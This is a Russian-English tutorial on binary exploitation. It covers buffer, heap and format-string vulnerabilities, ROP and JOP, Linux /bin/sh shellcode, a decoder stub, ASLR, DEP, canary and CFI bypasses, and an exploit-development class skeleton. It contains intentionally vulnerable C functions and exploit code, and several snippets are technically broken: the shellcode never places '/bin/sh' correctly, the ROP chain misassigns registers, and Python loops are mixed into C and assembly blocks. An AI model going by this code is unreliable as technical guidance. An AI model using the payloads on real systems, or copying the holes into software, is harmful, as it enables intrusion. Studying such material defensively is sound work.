# Exploitation Techniques

## Введение

Эксплуатация уязвимостей — это искусство использования программных ошибок для достижения непредусмотренного поведения. Понимание техник эксплуатации необходимо для тестирования на проникновение и разработки средств защиты.

## Types of Exploitation

### Memory Corruption

```c
// Типичные уязвимости памяти

// 1. Buffer Overflow
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Уязвимо!
}

// 2. Heap Overflow
void heap_vuln(char *data) {
    char *heap_buf = malloc(64);
    memcpy(heap_buf, data, strlen(data));  // Уязвимо!
}

// 3. Use-After-Free
void uaf_vuln() {
    char *ptr = malloc(64);
    free(ptr);
    // ptr теперь dangling pointer
    strcpy(ptr, "controlled");  // UAF!
}

// 4. Double-Free
void double_free() {
    char *ptr = malloc(64);
    free(ptr);
    free(ptr);  // Double free!
}
```

### Format String

```c
// Уязвимость format string
void format_vuln(char *user_input) {
    printf(user_input);  // Уязвимо!
}

// Эксплуатация
# Анализ
printf("%x %x %x")  // Читаем стек
printf("%s")        // Читаем по адресу
printf("%n")        // Запись в память
```

## Exploitation Techniques

### Stack Buffer Overflow

```assembly
; Exploit для buffer overflow
; Цель: переписать return address

; Схема эксплуатации
; [padding][NOP sled][shellcode][ret addr]*N

; Поиск offset
pattern_create.rb 200
pattern_offset.rb "Aa0Aa1Aa2..."

; Переполнение
python3 -c "
import struct
payload = 'A' * 64          # buffer
payload += 'B' * 4          # saved EBP  
payload += struct.pack('<I', 0xdeadbeef)  # ret addr
print(payload)
"
```

### Return-Oriented Programming (ROP)

```python
# ROP эксплуатация без execve
from pwn import *

# Gadgets
gadgets = {
    'pop_eax': 0x080491a3,      # pop eax; ret
    'pop_ecx': 0x080491ab,      # pop ecx; pop ebx; ret
    'pop_edx': 0x080491c3,      # pop edx; ret
    'int_0x80': 0x080491d3,     # int 0x80
    'mov_eax_0': 0x08049235,    # mov eax, [eax]; ret
}

# Построение цепочки
chain = [
    gadgets['pop_eax'], 0x0b,      # syscall number
    gadgets['pop_ecx'], 0, 0,      # argv = NULL
    gadgets['pop_edx'], 0,         # envp = NULL
    0x0804a010,                    # "/bin/sh" address
    gadgets['int_0x80'],           # syscall
]
```

### Jump-Oriented Programming (JOP)

```asm
; JOP использует indirect jumps вместо returns
; dispatcher для поиска gadgets
; Схема: [padding][jmp_call][dispatcher][...]
```

### Heap Exploitation

```c
// House of Spirit
// Освобождаем подконтрольные данные как chunk

void house_of_spirit() {
    malloc(100);  // First chunk
    char *fake = malloc(100);
    free(fake);   // Теперь fastbin указывает на fake
    malloc(100);  // Возвращает fake!
}

// House of Lore
// Обход check для small bins
```

## Shellcoding

### Linux x86 Shellcode

```assembly
; execve("/bin/sh", ["/bin/sh"], NULL)
section .text
global _start

_start:
    xor eax, eax        ; eax = 0
    push eax            ; NULL terminator
    mov dword [esp+4], eax  ; envp = NULL
    mov dword [esp+8], eax  ; argv = NULL
    mov edx, eax        ; argv = NULL
    mov ecx, eax        ; envp = NULL
    mov ebx, esp        ; pointer to "/bin/sh\x00"
    mov al, 0xb         ; sys_execve
    int 0x80            ; syscall

    section .data
    filename: db "/bin/sh", 0
```

### Position-Independent Shellcode

```python
# Алфавитный shellcode для bypass_filters
def alphashell():
    # Этап 1: decoder stub
    decoder = (
        "\xeb\x16"              # jmp short to decoder
        "\x5e"                  # start: pop esi
        "\x31\xc9"              # xor ecx, ecx
        "\x80\x36\x41"          # xor byte [esi], 0x41
        "\x80\x6e\x01\x01"      # sub byte [esi+1], 1
        "\x80\x6e\x01\x01"      # sub byte [esi+1], 1
        "\xff\xe6"              # jmp esi
        "\xe8\xe5\xff\xff\xff"  # encoded shellcode
    )
    return decoder
```

## Modern Exploitation Mitigations

### ASLR (Address Space Layout Randomization)

```c
// Обход ASLR

// 1. Information leak для определения адресов
printf("%p", buffer);

// 2. Brute force (32-bit - 16 бит рандома)
for i in range(65536):
    try_payload(i << 12);

// 3. Use-After-Free для leak
use_after_free_leak();

// 4. Stack spraying
// Размещение ROP цепочек на стеке
```

### DEP/NX (Data Execution Prevention)

```c
// Обход DEP

// 1. ROP для вызова mprotect
void enable_exec() {
    mprotect(page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
}

// 2. Return-to-libc
system("/bin/sh");

// 3. Jump-Oriented Programming
// Использование существующих кодовых гаджетов
```

### Stack Canaries

```assembly
; Обход canary
; Canary: 0xdeadbeef

; 1. Leak через format string
printf("%08x", __stack_chk_fail);

// 2. Brute force (1 байт за раз)
for byte1 in range(256):
    for byte2 in range(256):
        payload = buffer + [byte1, byte2, canary[2], canary[3]]
        if check_canary():
            print("Found!")
```

### CFI (Control Flow Integrity)

```c
// Обход CFI

// 1. Type confusion
// Использовать неправильный тип объекта

// 2. VTable corruption
// Переписать указатель vtable

// 3. Использовать разрешённые переходы
// Найти chain к целевому gadget
```

## Practical Exploit Development

```python
# Полный цикл разработки эксплойта
class Exploit:
    def __init__(self, target):
        self.target = target
        self.offset = 76
        self.libc_leak_offset = 0x1d9b88  # offset до system
        self.bin_sh_offset = 0x18cd5f
        
    def fuzz(self):
        """Фазинг для определения уязвимости"""
        for length in range(100, 1000, 10):
            payload = b'A' * length
            response = self.send(payload)
            if self.crashed(response):
                return length
        return None
    
    def exploit_development(self):
        """Разработка эксплойта"""
        # 1. Определить тип уязвимости
        # 2. Найти offset до EIP/RIP
        # 3. Локальные переменные
        # 4. Построить ROP цепочку
        # 5. Обойти mitigations
        pass
```

